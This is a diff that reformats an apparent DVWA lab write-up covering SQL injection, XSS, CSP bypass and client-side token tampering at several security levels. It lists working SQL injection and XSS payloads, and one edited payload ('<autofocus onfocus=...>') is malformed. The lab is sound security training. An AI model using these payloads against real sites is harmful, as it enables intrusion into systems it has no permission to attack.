@@ -343,7 +343,7 @@ malicious uploads.
 The Insecure CAPTCHA module could not work at first since the DVWA
 Docker image did not include a configured Google reCAPTCHA API key.
 Therefore, the public and private keys were generated, but trying the
-standard attack by changing “step=1” to “step=2” to skip captcha for
+standard attack by changing “step=1” to “step=2” in URL to skip captcha for
 password change still did not work, even at low level. A possible reason
 can be that adding real services like Google reCAPTCHA can accidentally
 patch the vulnerability we were supposed to exploit; it expected a
@@ -412,8 +412,10 @@ which is the real problem.
 
 1.  <ins>Security Level:</ins> Low
 
-<ins>Payload Used:</ins> 1' AND 1=1 \#, 1' AND 1=2 \#, 1 AND
-SUBSTRING(database(),1,1)='d' (if first letter of database name is ‘d’)
+<ins>Payload Used:</ins> 
+1' AND 1=1 \#, 
+1' AND 1=2 \#, 
+1 AND SUBSTRING(database(),1,1)='d' (if first letter of database name is ‘d’)
 
 <ins>Result:</ins> Query reveals injection works, and to ask yes/no
 questions
@@ -436,7 +438,9 @@ extract database information by asking true/false questions.
 
 2.  <ins>Security Level:</ins> Medium
 
-<ins>Payload Used:</ins> 1 AND 1=1 \#, 1 AND 1=2
+<ins>Payload Used:</ins> 
+1 AND 1=1 \#, 
+1 AND 1=2
 
 <ins>Result:</ins> Query reveals injection works through browser
 manipulation
@@ -446,7 +450,7 @@ manipulation
 <img src="./media/image59.png"
 style="width:6.15625in;height:1.53125in" />
 
-<ins>Explanation of Why it Workedl:</ins> At this level the user input field
+<ins>Explanation of Why it Worked:</ins> At this level the user input field
 is replaced with a dropdown menu containing user IDs. However by
 modifying the value of the dropdown using Inspect, it is possible to
 inject SQL logic such as \`1 AND 1=1\`. Due to lack of validation of
@@ -547,7 +551,7 @@ predict.
 1.  <ins>Security Level:</ins> Low
 
 <ins>Payload Used:</ins>
-http://localhost:8080/vulnerabilities/xss_d/?default=\<script\>alert('XSS')\</script\>
+http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert('XSS')\</script>
 
 <ins>Result:</ins> Alert popped up with the text “XSS”
 
@@ -563,8 +567,8 @@ without sanitizing it.
 2.  <ins>Security Level:</ins> Medium
 
 <ins>Payload Used:</ins>
-http://localhost:8080/vulnerabilities/xss_d/?default=\<img src=x
-onerror=alert('XSS')\>
+http://localhost:8080/vulnerabilities/xss_d/?default=<img src=x
+onerror=alert('XSS')>
 
 <ins>Result:</ins> Alert popped up with the text “XSS”.
 
@@ -600,7 +604,10 @@ vulnerability exists in the client-side JavaScript.
 
 1.  <ins>Security Level:</ins> Low
 
-<ins>Payload Used:</ins> \<script\>alert('XSS')\</script\>
+<ins>Payload Used:</ins> 
+```javascript
+<script>alert('XSS')</script>
+```
 
 <ins>Result:</ins> Alert notification with text ‘XSS’ popped up
 
@@ -616,8 +623,14 @@ passed to the code directly, the \<script\> tag executes.
 
 2.  <ins>Security Level:</ins> Medium
 
-<ins>Payload Used:</ins> \<script\>alert('XSS')\</script\> then \<img src=x
-onerror=alert('XSS')\>
+<ins>Payload Used:</ins> 
+```javascript
+<script>alert('XSS')</script>
+```
+then 
+```javascript
+<img src=x onerror=alert('XSS')>
+```
 
 <ins>Result:</ins> Alert notification with text ‘XSS’ popped up
 
@@ -638,8 +651,14 @@ alert to pop up.
 
 3.  <ins>Security Level:</ins> High
 
-<ins>Payload Used:</ins> \<img src=x onerror=alert('XSS')\> and \<input
-autofocus onfocus=alert('XSS')\>
+<ins>Payload Used:</ins> 
+```javascript
+<img src=x onerror=alert('XSS')>
+```
+and 
+```javascript
+<autofocus onfocus=alert('XSS')>
+```
 
 <ins>Result:</ins> Alert notification with text ‘XSS’ popped up
 
@@ -662,7 +681,11 @@ style="width:5.35357in;height:2.67188in" />
 
 1.  <ins>Security Level:</ins> Low
 
-<ins>Payload Used:</ins> \<script\>alert('Stored XSS')\</script\>
+<ins>Payload Used:</ins> 
+
+```javascript
+<script>alert('Stored XSS')</script>
+```
 
 <ins>Result:</ins> Alert pop-up with “Stored XSS” as text
 
@@ -681,7 +704,10 @@ malicious entries.
 
 2.  <ins>Security Level:</ins> Medium
 
-<ins>Payload Used:</ins> \<details open ontoggle=alert(1)\>
+<ins>Payload Used:</ins>
+```javascript
+<details open ontoggle=alert(1)>
+```
 
 <ins>Result:</ins> Alert pop-up with “1” as text
 
@@ -701,7 +727,10 @@ still vulnerable.
 
 3.  <ins>Security Level:</ins> High
 
-<ins>Payload Used:</ins> \<details open ontoggle=alert(1)\>
+<ins>Payload Used:</ins>
+```javascript
+<details open ontoggle=alert(1)>
+```
 
 <ins>Result:</ins> Alert pop-up with “1” as text
 
@@ -746,9 +775,10 @@ can bypass the CSP restrictions.
 
 2.  <ins>Security Level:</ins> Medium
 
-<ins>Payload Used:</ins> \<script
-nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="\>alert('CSP
-Bypass')\</script\>
+<ins>Payload Used:</ins>
+```javascript
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert('CSP Bypass')</script>
+```
 
 <ins>Result:</ins> Alert popped up with text “CSP Bypass”.
 
@@ -771,11 +801,11 @@ execution despite the CSP policy.
 
 <ins>Payload Used:</ins>
 
+```javascript
 var s = document.createElement("script");
-
 s.src = "/vulnerabilities/csp/source/jsonp.php?callback=console.log";
-
 document.body.appendChild(s);
+```
 
 <ins>Result:</ins> Console prints “answer=15” instead of the sum
 
@@ -805,12 +835,11 @@ bypasses the CSP policy script-src 'self', resulting in code execution.
 1.  <ins>Security Level:</ins> Low
 
 <ins>Payload Used:</ins>
-
+```javascript
 document.getElementById("phrase").value = "success";
-
 generate_token();
-
 document.getElementById("send").click();
+```
 
 <ins>Result:</ins> “Well done” string upon running of script
 
@@ -831,14 +860,13 @@ security checks must be implemented on the server side rather than
 relying on the client‑side.
 
 2.  <ins>Security Level:</ins> Medium
-
+   
 <ins>Payload Used:</ins>
-
+```javascript
 document.getElementById("phrase").value = "success";
-
 do_elsesomething("XX");
-
 document.getElementById("send").click();
+```
 
 <ins>Result:</ins> “Well done” string upon running of script
 
@@ -858,28 +886,22 @@ so exploiting the function in this file instead does the trick.
 3.  <ins>Security Level:</ins> High
 
 <ins>Payload Used:</ins>
-
+```javascript
 document.getElementById("phrase").value = "success";
-
 token_part_1("XX");
-
 token_part_2("success");
-
 token_part_3("ZZ");
-
 document.getElementById("send").click();
-
+```
 then
 
+```javascript
 document.getElementById("phrase").value = "success";
-
 token_part_1("XX");
-
 token_part_2("success");
-
 token_part_3("YY");
-
 document.getElementById("send").click();
+```
 
 <ins>Result:</ins> Invalid Token
 
@@ -1032,7 +1054,7 @@ penalties, financial losses, etc.
 
 **JavaScript:** Usually leads to A05: Injection
 
-**Bonus Task:**
+# **Bonus Task:**
 
 A docker network was first set up and dvwa was made to run on it.
 
